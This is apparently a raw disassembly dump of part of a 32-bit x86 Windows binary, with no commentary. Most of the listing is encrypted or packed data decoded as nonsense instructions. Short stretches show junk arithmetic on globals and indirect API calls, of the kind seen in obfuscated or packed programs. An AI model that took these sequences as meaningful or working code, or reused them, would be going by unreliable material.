  418ece:	ins    DWORD PTR es:[edi],dx
  418ecf:	popf   
  418ed0:	or     cl,ah
  418ed2:	mov    bl,0xb3
  418ed4:	les    ebp,FWORD PTR ds:0xf3d0869f
  418eda:	arpl   WORD PTR [ecx-0x63],di
  418edd:	mov    ebp,0x7ce1f3e3
  418ee2:	mov    al,0x4b
  418ee4:	into   
  418ee5:	loopne 0x418e87
  418ee7:	inc    esi
  418ee8:	push   esp
  418ee9:	inc    ebp
  418eea:	out    0x4c,al
  418eec:	ja     0x418edb
  418eee:	ins    BYTE PTR es:[edi],dx
  418eef:	cmpps  xmm0,xmm1,0x4d
  418ef3:	mov    esp,0x351702d
  418ef8:	into   
  418ef9:	or     ah,BYTE PTR [ebx-0x58]
  418efc:	mov    esp,0x990d3964
  418f01:	xchg   esp,eax
  418f02:	or     BYTE PTR es:[eax-0x3d014c99],dh
  418f09:	dec    edx
  418f0a:	jg     0x418f27
  418f0c:	jmp    0x418ebf
  418f0e:	mov    dh,0x20
  418f10:	sar    BYTE PTR [ecx+0x22],cl
  418f13:	mov    cl,BYTE PTR [ebx]
  418f15:	popa   
  418f16:	not    DWORD PTR [ebx-0x6c427501]
  418f1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f1d:	dec    ebp
  418f1e:	repz mov esp,0x332fd814
  418f24:	sbb    al,0x7b
  418f26:	adc    eax,DWORD PTR ds:0x76850191
  418f2c:	mov    ds:0xc50e17b7,eax
  418f31:	dec    ebp
  418f32:	outs   dx,DWORD PTR ds:[esi]
  418f33:	sub    al,dl
  418f35:	and    al,0x14
  418f37:	fwait
  418f38:	push   ecx
  418f39:	outs   dx,BYTE PTR ds:[esi]
  418f3a:	lods   al,BYTE PTR ds:[esi]
  418f3b:	jg     0x418f6d
  418f3d:	sub    al,0x83
  418f3f:	cmp    DWORD PTR [edi+0x44],edi
  418f42:	add    ah,BYTE PTR [esi+0x5d]
  418f45:	out    dx,al
  418f46:	xchg   esi,eax
  418f47:	inc    ecx
  418f48:	mov    al,ds:0xf58c43c2
  418f4d:	shl    DWORD PTR [edi+eiz*1-0x5e],1
  418f51:	loope  0x418f67
  418f53:	xor    dl,BYTE PTR ds:0x53f2b9ac
  418f59:	xor    al,0x28
  418f5b:	dec    edx
  418f5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f5d:	loope  0x418f26
  418f5f:	sbb    eax,0x460685d8
  418f64:	imul   esi,DWORD PTR [ebx-0x47],0x1626f306
  418f6b:	call   0x8318:0x72b8fa1
  418f72:	mov    fs,WORD PTR [ebp+0x4f]
  418f75:	add    edi,DWORD PTR [edi]
  418f77:	inc    eax
  418f78:	repz pop ds
  418f7a:	cs (bad) 
  418f7c:	fcom   DWORD PTR [esi+ecx*4-0x51]
  418f80:	in     al,0x69
  418f82:	mov    ebp,0x89328b39
  418f87:	out    dx,eax
  418f88:	in     al,dx
  418f89:	ret    0xb889
  418f8c:	loope  0x418fb5
  418f8e:	mov    eax,ds:0x2cded1af
  418f93:	repz (bad) 
  418f95:	jmp    0x7bf3:0xaae1bf8c
  418f9c:	and    al,0x7
  418f9e:	fistp  QWORD PTR [ebx]
  418fa0:	mov    ecx,0x1dfb09f1
  418fa5:	aam    0x11
  418fa7:	and    edi,edi
  418fa9:	repnz push ds
  418fab:	imul   ebx,DWORD PTR [ecx],0x5d972e8c
  418fb1:	pushf  
  418fb2:	aad    0x72
  418fb4:	or     dl,dh
  418fb6:	xchg   ah,ah
  418fb8:	pop    esp
  418fb9:	dec    ebp
  418fba:	pushf  
  418fbb:	aad    0x2
  418fbd:	scas   al,BYTE PTR es:[edi]
  418fbe:	push   ecx
  418fbf:	sbb    al,0x2f
  418fc1:	inc    edi
  418fc2:	cmp    al,0xc5
  418fc4:	add    eax,0x22f3e01e
  418fc9:	stc    
  418fca:	loopne 0x418f60
  418fcc:	push   edi
  418fcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fce:	and    bh,ah
  418fd0:	rcr    DWORD PTR [esi-0x31a78d03],0x63
  418fd7:	(bad)  
  418fd8:	jbe    0x418ff6
  418fda:	in     al,dx
  418fdb:	rcl    ebx,1
  418fdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fde:	ficom  WORD PTR [esi]
  418fe0:	aaa    
  418fe1:	das    
  418fe2:	pop    edi
  418fe3:	popf   
  418fe4:	sub    dh,al
  418fe6:	cli    
  418fe7:	retf   
  418fe8:	inc    edx
  418fe9:	ja     0x419000
  418feb:	je     0x419000
  418fed:	jns    0x418f87
  418fef:	mov    ebx,0x1782ba63
  418ff4:	ins    BYTE PTR es:[edi],dx
  418ff5:	xor    eax,0x2d030ee7
  418ffa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ffb:	lea    edi,[edi+eax*1+0x7678e872]
  419002:	fcomp  DWORD PTR [edx+0x3a9be9c6]
  419008:	rol    BYTE PTR [edi+0x287a8fc4],1
  41900e:	pop    ebx
  41900f:	mov    cl,0xf0
  419011:	imul   eax,DWORD PTR [ebp+0xc],0xfffffff6
  419015:	call   0xa99b:0x4f686e60
  41901c:	xchg   esi,eax
  41901d:	sbb    eax,0xd6bc6bb7
  419022:	push   cs
  419023:	sbb    al,0xfd
  419025:	test   DWORD PTR [edx-0x61],eax
  419028:	xor    BYTE PTR ds:0xd567605e,al
  41902e:	mov    ch,0x38
  419030:	push   ds
  419031:	mov    BYTE PTR [edx-0xcc54f08],bl
  419037:	out    dx,al
  419038:	popf   
  419039:	dec    ebp
  41903a:	mov    ch,0x34
  41903c:	stc    
  41903d:	divps  xmm4,xmm0
  419040:	retf   0x6d18
  419043:	(bad)  
  419044:	(bad)  
  419046:	dec    ebp
  419047:	adc    al,0x52
  419049:	icebp  
  41904a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41904b:	adc    eax,0xdcd883a
  419050:	popf   
  419051:	jo     0x419020
  419053:	jo     0x4190b3
  419055:	mov    dh,0xc5
  419057:	cmp    al,0x2c
  419059:	out    0xa2,al
  41905b:	icebp  
  41905c:	in     al,dx
  41905d:	(bad)  
  41905e:	mov    eax,ds:0x72bf2fce
  419063:	sub    cl,BYTE PTR [edx]
  419065:	inc    ebx
  419066:	add    BYTE PTR [esi-0x4e],ah
  419069:	cdq    
  41906a:	sbb    al,0x15
  41906c:	push   ds
  41906d:	cld    
  41906e:	je     0x4190cf
  419070:	and    DWORD PTR [edx+0x61],esp
  419073:	fsubr  st(2),st
  419075:	ins    BYTE PTR es:[edi],dx
  419076:	or     al,0xfb
  419078:	repnz fisttp DWORD PTR [ebx+edi*1+0x29]
  41907d:	out    dx,al
  41907e:	mov    ebp,DWORD PTR [esi]
  419080:	scas   eax,DWORD PTR es:[edi]
  419081:	loopne 0x41904d
  419083:	stc    
  419084:	sub    eax,DWORD PTR [edi-0x14a70da3]
  41908a:	icebp  
  41908b:	imul   esp,esi,0xf23eb052
  419091:	adc    ebx,DWORD PTR [esi+0x5e6e6137]
  419097:	div    esi
  419099:	mov    edx,DWORD PTR ds:0x422570
  41909f:	mov    esi,DWORD PTR [ebp+0x8]
  4190a2:	push   0x20
  4190a4:	or     al,0xc1
  4190a6:	xor    dl,al
  4190a8:	add    dl,BYTE PTR [ebp+0xc]
  4190ab:	lea    eax,[edx+0x75]
  4190ae:	mov    edx,DWORD PTR [ebp-0x1c]
  4190b1:	mov    BYTE PTR [edx+esi*1],al
  4190b4:	mov    eax,ds:0x42256c
  4190b9:	mov    edx,DWORD PTR [ebp-0x20]
  4190bc:	mov    esi,DWORD PTR [ebp-0x4]
  4190bf:	xor    eax,0x40bf
  4190c4:	add    eax,0xfffffade
  4190c9:	and    edx,eax
  4190cb:	mov    eax,ds:0x422568
  4190d0:	xor    edx,0x2131
  4190d6:	xor    esi,0x65a0
  4190dc:	or     esi,eax
  4190de:	mov    eax,DWORD PTR [ebp-0x8]
  4190e1:	add    eax,DWORD PTR [ebp-0xc]
  4190e4:	mov    ebx,DWORD PTR [ebp-0x10]
  4190e7:	add    ecx,edx
  4190e9:	xor    edx,edx
  4190eb:	div    ebx
  4190ed:	xor    edx,edx
  4190ef:	mov    ebx,0x56fd
  4190f4:	or     eax,0x54f5
  4190f9:	div    ebx
  4190fb:	pop    edx
  4190fc:	sub    edx,eax
  4190fe:	mov    eax,DWORD PTR [ebp-0x14]
  419101:	and    eax,esi
  419103:	mov    esi,ecx
  419105:	sub    esi,eax
  419107:	add    esi,edi
  419109:	cmp    esi,edx
  41910b:	jbe    0x418cf0
  419111:	pop    ebx
  419112:	pop    edi
  419113:	pop    esi
  419114:	leave  
  419115:	ret    0x8
  419118:	push   ebp
  419119:	mov    ebp,esp
  41911b:	and    esp,0xfffffff8
  41911e:	sub    esp,0x64
  419121:	push   ebx
  419122:	push   esi
  419123:	push   edi
  419124:	push   DWORD PTR ds:0x42204c
  41912a:	push   DWORD PTR ds:0x42204c
  419130:	jmp    0x4193c6
  419135:	jle    0x41919d
  419137:	mov    eax,ds:0x7f2da9e5
  41913c:	lods   al,BYTE PTR ds:[esi]
  41913d:	sbb    BYTE PTR [edx+0x2bdc3b81],bh
  419143:	or     eax,0xc122fc05
  419148:	mov    ebx,0xbbbbbfa8
  41914d:	fisubr DWORD PTR [esi+0x69380aea]
  419153:	dec    edx
  419154:	xchg   ebp,eax
  419155:	adc    DWORD PTR cs:[ecx+0x54247fa9],ebx
  41915c:	xchg   esi,eax
  41915d:	sub    ebx,DWORD PTR [esi+0x35b5732d]
  419163:	push   esi
  419164:	or     DWORD PTR [ebp-0x2e23f7d0],ecx
  41916a:	scas   al,BYTE PTR es:[edi]
  41916b:	and    bh,bh
  41916d:	adc    al,0x66
  41916f:	popf   
  419170:	jbe    0x4191b6
  419172:	pop    ss
  419173:	jmp    FWORD PTR [ecx]
  419175:	cs pop ebx
  419177:	mov    ds:0x5b65dff0,al
  41917c:	mov    ds:0x7cb73aeb,eax
  419181:	xchg   edi,eax
  419182:	adc    dh,BYTE PTR [ebx+0x74]
  419185:	in     eax,dx
  419186:	je     0x4191e0
  419188:	cmp    cl,BYTE PTR [ecx+0x4311b351]
  41918e:	push   edi
  41918f:	ret    
  419190:	sub    al,0x93
  419192:	jmp    0x41915d
  419194:	pop    edi
  419195:	ins    BYTE PTR es:[edi],dx
  419196:	adc    edi,eax
  419198:	(bad)  
  419199:	(bad)  
  41919a:	popf   
  41919b:	in     eax,0x47
  41919d:	pop    edi
  41919e:	loope  0x419131
  4191a0:	psllq  mm3,QWORD PTR [edi-0x32]
  4191a4:	stc    
  4191a5:	ret    0x9ee6
  4191a8:	dec    esi
  4191a9:	call   0x516b8153
  4191ae:	aaa    
  4191af:	jae    0x419146
  4191b1:	push   ds
  4191b2:	jb     0x4191ec
  4191b4:	sub    edx,DWORD PTR [edi-0x657b959]
  4191ba:	jge    0x4191af
  4191bc:	clc    
  4191bd:	mov    bl,0xdd
  4191bf:	jbe    0x419238
  4191c1:	mov    ch,0x4d
  4191c3:	adc    DWORD PTR [esi+0x2c5bb538],edx
  4191c9:	mov    esp,0x4c17be15
  4191ce:	imul   edi,esi,0x2684a116
  4191d4:	(bad)  
  4191d5:	jmp    0x4191c0
  4191d7:	pop    eax
  4191d8:	jecxz  0x419208
  4191da:	push   edx
  4191db:	push   ebx
  4191dc:	cdq    
  4191dd:	mov    edx,0xa71d394d
  4191e2:	ds or  dl,al
  4191e5:	int    0xd
  4191e7:	add    ebx,edi
  4191e9:	sar    BYTE PTR [esi-0x3e],1
  4191ec:	stos   BYTE PTR es:[edi],al
  4191ed:	pop    esi
  4191ee:	inc    edi
  4191ef:	jnp    0x4191a1
  4191f1:	ja     0x41919a
  4191f3:	addr16 pop esp
  4191f5:	in     al,dx
  4191f6:	pop    eax
  4191f7:	pusha  
  4191f8:	mov    eax,ds:0xaadad21e
  4191fd:	(bad)  
  4191fe:	out    dx,eax
  4191ff:	xor    dh,BYTE PTR [edi-0x36]
  419202:	call   0x363c395d
  419207:	jb     0x4191ed
  419209:	sbb    ecx,DWORD PTR [ecx-0x6c3022f1]
  41920f:	test   BYTE PTR [ecx-0x25],ah
  419212:	xchg   edx,eax
  419213:	cwde   
  419214:	and    eax,DWORD PTR [eax]
  419216:	and    DWORD PTR [ebp-0x1eb54e31],edi
  41921c:	cmp    cl,BYTE PTR [edx]
  41921e:	mov    BYTE PTR [ebx+0x65c474db],bh
  419224:	cwde   
  419225:	inc    dh
  419227:	xchg   ebp,eax
  419228:	aad    0x47
  41922a:	lahf   
  41922b:	add    BYTE PTR [edx],0xcf
  41922e:	mov    edx,0x55465b0f
  419233:	sub    eax,0xfbe46f02
  419238:	adc    dl,BYTE PTR [edi+edx*4+0x7f]
  41923c:	iret   
  41923d:	rcl    DWORD PTR ds:0xc531e881,1
  419243:	mov    esi,0x13a2ed72
  419248:	mov    al,0x66
  41924a:	xchg   al,ch
  41924c:	sub    eax,0xcb63b50f
  419251:	stc    
  419252:	(bad)  
  419253:	sti    
  419254:	mov    esp,0x3241f689
  419259:	xchg   ebp,eax
  41925a:	xchg   ebx,eax
  41925b:	jecxz  0x4192cc
  41925d:	(bad)  
  41925e:	aam    0x33
  419260:	fcomp  QWORD PTR [edx]
  419262:	and    dh,cl
  419264:	pop    esp
  419265:	cli    
  419266:	push   cs
  419267:	into   
  419268:	(bad)  
  419269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41926a:	sbb    esi,eax
  41926c:	int3   
  41926d:	test   al,ch
  41926f:	jno    0x41922b
  419271:	and    bh,BYTE PTR [ecx]
  419273:	jnp    0x41923a
  419275:	or     dl,BYTE PTR [ecx-0x42]
  419278:	inc    edx
  419279:	mov    ebx,0xa92ae7ba
  41927e:	pop    edx
  41927f:	jmp    0xc7e8:0x47bd8af6
  419286:	push   ebp
  419287:	hlt    
  419288:	pop    esp
  419289:	pop    esi
  41928a:	in     eax,0x6a
  41928c:	add    ch,BYTE PTR [edi]
  41928e:	xchg   edi,eax
  41928f:	pop    eax
  419290:	sbb    DWORD PTR [ebp+0x5c845926],eax
  419296:	fist   WORD PTR [edx]
  419298:	jmp    0x9303:0x439ad565
  41929f:	sub    eax,0x5de38321
  4192a4:	push   ebp
  4192a5:	popf   
  4192a6:	in     al,dx
  4192a7:	setp   BYTE PTR [eax+0x75]
  4192ab:	daa    
  4192ac:	retf   0x8283
  4192af:	clc    
  4192b0:	or     WORD PTR [eax-0x54],cx
  4192b4:	inc    ecx
  4192b5:	pop    ds
  4192b6:	mov    edx,0x3654aed5
  4192bb:	jne    0x4192ab
  4192bd:	sbb    bl,BYTE PTR [ebx]
  4192bf:	sub    al,0x76
  4192c1:	bound  edx,QWORD PTR [ecx+esi*2]
  4192c4:	pop    edi
  4192c5:	jbe    0x4192f2
  4192c7:	or     eax,0x69eb45cd
  4192cc:	xor    bl,cl
  4192ce:	inc    ebx
  4192cf:	xchg   esi,eax
  4192d0:	push   0xffa8ab63
  4192d5:	call   0x86885653
  4192da:	pop    ds
  4192db:	(bad)  
  4192dd:	into   
  4192de:	cs or  al,0x5d
  4192e1:	cwde   
  4192e2:	leave  
  4192e3:	add    esp,eax
  4192e5:	imul   edi,DWORD PTR [ebp+0x37],0x58
  4192e9:	hlt    
  4192ea:	xor    al,0xd5
  4192ec:	pop    edi
  4192ed:	sbb    BYTE PTR [ebp-0x51],ch
  4192f0:	sub    BYTE PTR [esi-0x5cb62c89],ah
  4192f6:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4192f8:	jno    0x41927c
  4192fa:	in     eax,dx
  4192fb:	mov    bl,BYTE PTR [edi+eiz*8+0x3b]
  4192ff:	jo     0x419318
  419301:	push   es
  419302:	xor    al,0xd
  419304:	popf   
  419305:	lahf   
  419306:	ret    0xb6de
  419309:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41930b:	mov    dl,0xa8
  41930d:	mov    edx,0xa34a5761
  419312:	stos   DWORD PTR es:[edi],eax
  419313:	push   esp
  419314:	jg     0x41929b
  419316:	in     eax,0xbd
  419318:	or     eax,0xd016210
  41931e:	or     edi,ebp
  419320:	sub    eax,0x65685771
  419325:	sbb    ah,BYTE PTR [edx+0xd53993b]
  41932b:	xchg   ecx,eax
  41932c:	xchg   ebp,eax
  41932d:	nop
  41932e:	sub    edx,DWORD PTR [ebp+0x76a36202]
  419334:	int    0x70
  419336:	(bad)  
  419337:	out    0x33,eax
  419339:	cs push cs
  41933b:	pop    es
  41933c:	sub    ecx,ecx
  41933e:	xchg   edx,eax
  41933f:	cmc    
  419340:	pop    es
  419341:	cli    
  419342:	inc    eax
  419343:	push   edi
  419344:	push   eax
  419345:	mov    al,ds:0x814db375
  41934a:	sub    DWORD PTR [ecx+0x2c91d618],esi
  419350:	in     al,0x94
  419352:	and    BYTE PTR [esi],0xbb
  419355:	pop    eax
  419356:	jl     0x419372
  419358:	lds    ebx,FWORD PTR [eax+0x27]
  41935b:	lea    edi,[edi]
  41935d:	iret   
  41935e:	inc    esi
  41935f:	pop    ss
  419360:	jns    0x41932a
  419362:	lds    eax,FWORD PTR [esi+eax*2+0x48bf7e78]
  419369:	adc    dh,BYTE PTR [edx-0x7ad710d7]
  41936f:	inc    edi
  419370:	pushf  
  419371:	es stc 
  419373:	xlat   BYTE PTR ds:[ebx]
  419374:	mov    ah,al
  419376:	popa   
  419377:	call   0x86beaffe
  41937c:	and    al,BYTE PTR [ebp+edi*1+0x729b8a4a]
  419383:	jg     0x41932d
  419385:	jmp    0x4193f4
  419387:	xor    al,0x82
  419389:	aad    0xbd
  41938b:	xchg   edi,ecx
  41938d:	cmc    
  41938e:	leave  
  41938f:	sbb    al,cl
  419391:	or     BYTE PTR [eax-0x4c42b796],0xc3
  419398:	jne    0x419370
  41939a:	repz pop es
  41939c:	sub    edx,DWORD PTR [edi]
  41939e:	clc    
  41939f:	pop    esi
  4193a0:	lods   al,BYTE PTR ds:[esi]
  4193a1:	call   0x3703:0x4e763fc1
  4193a8:	mov    cl,0x65
  4193aa:	repnz frstor [ecx-0x558c74f0]
  4193b1:	pop    ds
  4193b2:	mov    edi,0x71a0e6a0
  4193b7:	(bad)  
  4193b8:	pop    esp
  4193b9:	lds    edx,FWORD PTR [eax+0x3a273821]
  4193bf:	mov    ecx,cs
  4193c1:	cli    
  4193c2:	dec    ebp
  4193c3:	push   0x15ffbe95
  4193c8:	mov    WORD PTR [edx-0x3f7affbe],cs
  4193ce:	je     0x4193db
  4193d4:	xor    eax,eax
  4193d6:	jmp    0x41d6c3
  4193db:	mov    esi,0x1ff
  4193e0:	xor    ebx,ebx
  4193e2:	push   DWORD PTR ds:0x42204c
  4193e8:	sub    DWORD PTR ds:0x428211,0x7d15
  4193f2:	call   DWORD PTR ds:0x428a54
  4193f8:	cmp    DWORD PTR ds:0x428211,0x0
  4193ff:	mov    ecx,0x4bce
  419404:	mov    ecx,0x753
  419409:	jmp    0x41945c
  41940e:	not    ecx
  419410:	cmp    DWORD PTR ds:0x428211,0x0
  419417:	ja     0x419444
  41941d:	push   0x5249
  419422:	call   DWORD PTR ds:0x428a84
  419428:	sbb    DWORD PTR ds:0x428289,0x4ad7
  419432:	mov    ecx,DWORD PTR ds:0x4281b1
  419438:	adc    DWORD PTR ds:0x428225,ecx
  41943e:	sub    DWORD PTR ds:0x428211,edi
  419444:	sbb    DWORD PTR ds:0x428215,ecx
  41944a:	add    ecx,0x7777
  419450:	sbb    DWORD PTR ds:0x4281a5,0x6d20
  41945a:	or     ecx,ecx
  41945c:	mov    DWORD PTR [esp+0x10],0x3a36
  419464:	xor    ecx,eax
  419466:	mov    DWORD PTR [esp+0x18],0x544d
  41946e:	adc    DWORD PTR ds:0x4282cd,ecx
  419474:	mov    DWORD PTR [esp+0x20],0x4aef
  41947c:	cmp    DWORD PTR ds:0x4282b5,0x0
  419483:	mov    ecx,DWORD PTR ds:0x4282cd
  419489:	movzx  ecx,BYTE PTR ds:0x4282b1
  419490:	mov    ecx,DWORD PTR ds:0x4282bd
  419496:	movzx  ecx,BYTE PTR ds:0x428211
  41949d:	jmp    0x41978d
  4194a2:	not    eax
  4194a4:	cmp    DWORD PTR ds:0x4282b5,0x0
  4194ab:	jbe    0x4194e9
  4194b1:	push   0x75ba
  4194b6:	push   0x5645
  4194bb:	push   0x5b6b
  4194c0:	push   0x5b12
  4194c5:	push   0x5002
  4194ca:	push   0x689c
  4194cf:	call   DWORD PTR ds:0x4289f8
  4194d5:	and    DWORD PTR ds:0x4282c9,0x428221
  4194df:	mov    DWORD PTR ds:0x4281a9,0x783a
  4194e9:	or     DWORD PTR ds:0x4281b1,edx
  4194ef:	add    ecx,DWORD PTR ds:0x42826d
  4194f5:	sub    ecx,ecx
  4194f7:	jmp    0x41978d
  4194fc:	dec    eax
  4194fd:	mov    eax,0x3cb23692
  419502:	ins    BYTE PTR es:[edi],dx
  419503:	mov    esp,0xfba5e0e3
  419508:	jg     0x419507
  41950a:	dec    ebx
  41950b:	xor    edx,esp
  41950d:	sar    DWORD PTR es:[ebx-0x44444058],0x2
  419515:	lea    eax,[edx]
  419517:	inc    eax
  419518:	in     eax,dx
  419519:	lahf   
  41951a:	jne    0x419556
  41951c:	popa   
  41951d:	sub    eax,0xaee46322
  419522:	je     0x4194db
  419524:	pop    esp
  419525:	push   ecx
  419526:	in     eax,dx
  419527:	mov    eax,ds:0xfe6a19ab
  41952c:	jbe    0x4194d9
  41952e:	and    al,0x31
  419530:	xchg   ebp,eax
  419531:	dec    ebx
  419532:	loope  0x4194f0
  419534:	int    0xa3
  419536:	jb     0x4194d1
  419538:	fbld   TBYTE PTR [esi+0x14]
  41953b:	frstor [eax]
  41953d:	or     eax,0xe8d73a0c
  419542:	and    DWORD PTR [ecx+0x4d],esp
  419545:	ret    
  419546:	inc    eax
  419547:	fidivr DWORD PTR [edi+0x9e18f26]
  41954d:	inc    edi
  41954e:	shl    ecx,0x2b
  419551:	cmp    DWORD PTR [esi-0x115fe4d3],esi
  419557:	dec    edi
  419558:	pop    esi
  419559:	jecxz  0x4195a7
  41955b:	not    ch
  41955d:	dec    esp
  41955e:	add    DWORD PTR gs:[esp+esi*2+0x64],eax
  419563:	cmp    BYTE PTR [edi+edx*2],0xce
  419567:	sbb    BYTE PTR [ebp+0x5b],al
  41956a:	mov    esi,0x341c9bd6
  41956f:	pop    ecx
  419570:	cmp    al,0x16
  419572:	dec    eax
  419573:	jns    0x4195e4
  419575:	lods   eax,DWORD PTR ds:[esi]
  419576:	dec    edx
  419577:	or     eax,0x3ecafbf2
  41957c:	ds test eax,0xdd15ca18
  419582:	test   DWORD PTR [ecx],0x36b7f88f
  419588:	pusha  
  419589:	int3   
  41958a:	add    ebx,DWORD PTR [ecx]
  41958c:	fild   DWORD PTR [ebx]
  41958e:	cmp    eax,0x7e2a2b96
  419593:	lds    ebx,FWORD PTR [edi]
  419595:	adc    cl,bl
  419597:	xchg   ebp,edi
  419599:	test   eax,0x52d8cf71
  41959e:	sub    BYTE PTR [ebp+0x44],cl
  4195a1:	jno    0x41952b
  4195a3:	or     esp,0xc8c30379
  4195a9:	mov    WORD PTR [esi+0x700bccb9],fs
  4195af:	add    DWORD PTR [ebp+0x5d],ebx
  4195b2:	test   eax,0x3d52851c
  4195b7:	xchg   edx,eax
  4195b8:	ror    BYTE PTR [edx+ebp*8],0x58
  4195bc:	jns    0x41960e
  4195be:	push   0xffffff85
  4195c0:	mov    ebp,0xe231a26b
  4195c5:	enter  0x707a,0xa2
  4195c9:	lahf   
  4195ca:	xor    bl,BYTE PTR [eax+esi*4+0x5aa25df7]
  4195d1:	sub    DWORD PTR [ebp+0x4f],eax
  4195d4:	fbld   TBYTE PTR [edi]
  4195d6:	sbb    eax,0xa6c5418a
  4195db:	jle    0x41965a
  4195dd:	and    eax,0x1c0a9ed1
  4195e2:	fwait
  4195e3:	jb     0x4195ea
  4195e5:	add    al,BYTE PTR [ecx+0x78b118e8]
  4195eb:	outs   dx,BYTE PTR ds:[esi]
  4195ec:	rol    esi,cl
  4195ee:	jmp    0x4195c4
  4195f0:	(bad)  
  4195f1:	outs   dx,DWORD PTR ds:[esi]
  4195f2:	adc    BYTE PTR [edx+ebx*1],cl
  4195f5:	outs   dx,BYTE PTR ds:[esi]
  4195f6:	fs xchg ebx,eax
  4195f8:	cmp    esi,DWORD PTR [ecx-0x15cf9cd3]
  4195fe:	mov    ebx,0x49e0c7b1
  419603:	lds    ebp,FWORD PTR [ebx-0x75e121c3]
  419609:	inc    esi
  41960a:	(bad)  
  41960b:	push   ebx
  41960c:	outs   dx,BYTE PTR ds:[esi]
  41960d:	mov    dl,BYTE PTR [esp+edi*4-0x34]
  419611:	ins    BYTE PTR es:[edi],dx
  419612:	lods   al,BYTE PTR ds:[esi]
  419613:	ins    BYTE PTR es:[edi],dx
  419614:	int    0x95
  419616:	inc    esi
  419617:	imul   esi,DWORD PTR [ecx*4-0x5fb54ef7],0xffffffee
  41961f:	cld    
  419620:	mov    ds:0x757a99e8,al
  419625:	mov    bh,0x70
  419627:	ret    0x71e6
  41962a:	jne    0x4195ad
  41962c:	adc    al,0x65
  41962e:	cmp    bh,BYTE PTR [edi-0x6d]
  419631:	and    al,0x60
  419633:	fcmovb st,st(6)
  419635:	mov    eax,ds:0xbf48d85b
  41963a:	push   ds
  41963b:	mov    esi,0xdb9c5428
  419640:	and    edi,ebp
  419642:	cmp    ecx,DWORD PTR [ebp+0x3f]
  419645:	jo     0x419600
  419647:	nop
  419648:	mov    eax,0xadb91f36
  41964d:	fbld   TBYTE PTR [edi-0x4068cda6]
  419653:	pop    edx
  419654:	in     al,0xe2
  419656:	xchg   edx,eax
  419657:	mov    eax,0xf5ffada3
  41965c:	inc    edx
  41965d:	inc    ebp
  41965e:	and    BYTE PTR [edi+0x4e20cc9e],dl
  419664:	dec    edi
  419665:	mov    cs,WORD PTR [edi+0x7bc05d1c]
  41966b:	pop    es
  41966c:	adc    eax,0x54c6d90c
  419671:	loope  0x4196e4
  419673:	xor    edi,ebx
  419675:	aam    0xe
  419677:	loope  0x4196ad
  419679:	sbb    dl,BYTE PTR [edx]
  41967b:	dec    ecx
  41967c:	sbb    BYTE PTR [eax],cl
  41967e:	push   esp
  41967f:	(bad)  
  419680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419681:	add    ebp,DWORD PTR [ebx+ebx*8+0x49]
  419685:	scas   eax,DWORD PTR es:[edi]
  419686:	clc    
  419687:	or     bh,ah
  419689:	jp     0x419666
  41968b:	mov    BYTE PTR [eax-0x12],al
  41968e:	xchg   esi,eax
  41968f:	out    dx,al
  419690:	mov    ebp,DWORD PTR [ebp-0x7273e110]
  419696:	sub    eax,0xb923b001
  41969b:	add    eax,ebx
  41969d:	add    eax,0x5f9c577c
  4196a2:	pop    esp
  4196a3:	int3   
  4196a4:	xchg   ebp,eax
  4196a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196a6:	popf   
  4196a7:	int    0x42
  4196a9:	mov    ebp,fs
  4196ab:	icebp  
  4196ac:	pusha  
  4196ad:	daa    
  4196ae:	mov    dh,0x9e
  4196b0:	pop    ebx
  4196b1:	and    al,0x45
  4196b3:	inc    edi
  4196b4:	and    BYTE PTR [ebx+0x6c9c300],dh
  4196ba:	adc    BYTE PTR [edi],0xfb
  4196bd:	inc    ebp
  4196be:	or     dh,BYTE PTR [ebp-0x2a]
  4196c1:	dec    ecx
  4196c2:	je     0x419707
  4196c4:	mov    eax,ds:0x1ddb4ee3
  4196c9:	jmp    0x290a:0x80d671d4
  4196d0:	or     esi,eax
  4196d2:	not    eax
  4196d4:	test   eax,0x4374cd15
  4196d9:	repnz imul DWORD PTR [eax+eax*1-0x8]
  4196de:	inc    ebp
  4196df:	push   0x5d
  4196e1:	invd   
  4196e3:	test   DWORD PTR [ebx],esi
  4196e5:	adc    al,0x49
  4196e7:	ins    BYTE PTR es:[edi],dx
  4196e8:	les    edx,FWORD PTR [ebx+ebp*2]
  4196eb:	inc    edx
  4196ec:	jmp    0x30412d69
  4196f1:	ins    BYTE PTR es:[edi],dx
  4196f2:	inc    ebp
  4196f3:	leave  
  4196f4:	and    dl,bl
  4196f6:	sbb    al,cl
  4196f8:	dec    edx
  4196f9:	mov    bl,0x83
  4196fb:	clc    
  4196fc:	imul   edx,esi,0xfffffff9
  4196ff:	pop    edx
  419700:	xor    al,0x12
  419702:	xor    ebp,DWORD PTR [ebp+0x13]
  419705:	sahf   
  419706:	mov    esp,0xb0b4bf71
  41970b:	(bad)  [edi]
  41970d:	add    eax,0xa48d7d9c
  419712:	mov    edi,0xd6dd66a
  419717:	(bad)  
  419718:	adc    al,0xc3
  41971a:	and    al,0x35
  41971c:	out    0x51,eax
  41971e:	gs in  eax,0x82
  419721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419722:	pop    es
  419723:	ret    0xe8f6
  419726:	outs   dx,BYTE PTR ds:[esi]
  419727:	pop    esp
  419728:	(bad)  
  41972a:	xchg   esp,eax
  41972b:	popa   
  41972c:	sub    al,0xda
  41972e:	js     0x419703
  419730:	xor    eax,0x5ae0262b
  419735:	dec    ebx
  419736:	cwde   
  419737:	pop    esi
  419738:	mov    edx,DWORD PTR [ebp+0x12]
  41973b:	fstp   DWORD PTR [ecx+0x515ec709]
  419741:	sub    eax,0x200ee1
  419746:	(bad)  
  419747:	sbb    DWORD PTR [edi+0x60a20372],ebx
  41974d:	add    eax,0xa75d3d44
  419752:	sti    
  419753:	mov    esi,0x4ff4262c
  419758:	or     ebx,edi
  41975a:	mov    eax,0xc958ea33
  41975f:	push   ebx
  419760:	or     cl,bh
  419762:	out    0x2c,al
  419764:	jge    0x419768
  419766:	ret    0x8338
  419769:	jg     0x419747
